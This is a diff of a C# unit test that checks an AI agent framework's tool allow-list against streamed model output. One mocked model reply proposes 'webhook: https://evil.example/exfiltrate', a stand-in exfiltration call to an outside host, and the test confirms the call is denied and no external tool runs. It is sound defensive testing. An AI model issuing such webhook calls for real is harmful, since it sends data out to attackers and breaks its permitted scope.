@@ -3,6 +3,7 @@
 // Licensed under the The Standard Software License (TSSL)
 // ---------------------------------------------------------------
 
+using Standard.Agents.Models.Clients.Agents;
 using Standard.Agents.Models.Foundations.Skills;
 using FluentAssertions;
 using Moq;
@@ -32,6 +33,21 @@ public class ToolAllowListTests
                 .Returns((string systemPrompt, string userPrompt, ResolvedInference _) =>
                     generator.Object.GenerateAsync(systemPrompt, userPrompt));
 
+        generator.Setup(broker =>
+            broker.GenerateStreamAsync(
+                It.IsAny<string>(), It.IsAny<string>(), It.IsAny<CancellationToken>()))
+                .Returns(OneReply("ACTION: webhook: https://evil.example/exfiltrate"));
+
+        generator.Setup(broker => broker.GenerateStreamAsync(
+            It.IsAny<string>(), It.IsAny<string>(), It.IsAny<ResolvedInference>(),
+            It.IsAny<CancellationToken>()))
+                .Returns((
+                    string systemPrompt,
+                    string userPrompt,
+                    ResolvedInference _,
+                    CancellationToken token) =>
+                        generator.Object.GenerateStreamAsync(systemPrompt, userPrompt, token));
+
         var mcp = new Mock<IMcpBroker>();
 
         var skills = new Mock<ISkillBroker>();
@@ -51,13 +67,28 @@ public class ToolAllowListTests
             .AllowTools("calculator");
 
         // when — the brain proposes a tool outside the allow-list
-        string answer = await agent.ProcessPromptAsync("call the webhook");
+        List<string> streamed = [];
 
-        // then — it is denied at the perimeter, and no external tool is ever invoked
-        answer.Should().Contain("not permitted");
+        await foreach (AgentStreamEvent streamEvent in
+            agent.StreamPromptAsync("call the webhook"))
+        {
+            streamed.Add(streamEvent.Content);
+        }
+
+        // then — it is denied at the perimeter, and no external tool is ever invoked. The
+        // denial is visible on the stream; the capped run itself delivers no answer, because
+        // a denial notice is not one.
+        streamed.Should().Contain(content => content.Contains("not permitted"));
 
         mcp.Verify(broker =>
             broker.CallAsync(It.IsAny<string>(), It.IsAny<string>()),
                 Times.Never);
+    }
+
+    private static async IAsyncEnumerable<string> OneReply(string reply)
+    {
+        await Task.CompletedTask;
+
+        yield return reply;
     }
 }
